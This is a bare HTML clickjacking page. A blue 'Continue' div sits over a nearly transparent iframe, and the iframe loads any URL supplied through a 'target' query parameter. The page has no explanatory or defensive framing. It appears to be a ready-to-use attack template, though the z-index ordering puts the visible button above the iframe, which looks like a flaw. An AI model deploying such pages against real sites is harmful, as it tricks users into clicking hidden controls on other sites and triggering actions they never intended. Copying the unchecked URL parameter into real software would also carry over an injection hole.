<!DOCTYPE html>
<html>
<head>
  <style>
    .fake-button {
      position: absolute;
      top: 200px; left: 100px;
      width: 200px; height: 60px;
      background: #007bff;
      color: white;
      font-size: 18px;
      line-height: 60px;
      text-align: center;
      z-index: 2;
    }
    iframe {
      position: absolute;
      top: 200px; left: 100px;
      width: 200px; height: 60px;
      opacity: 0.01;
      z-index: 1;
      border: none;
    }
  </style>
</head>
<body>
  <div class="fake-button">Continue</div>
  <iframe id="iframe"></iframe>

  <script>
    const target = decodeURIComponent(new URLSearchParams(location.search).get("target") || "");
    if (target) document.getElementById("iframe").src = target;
  </script>
</body>
</html>
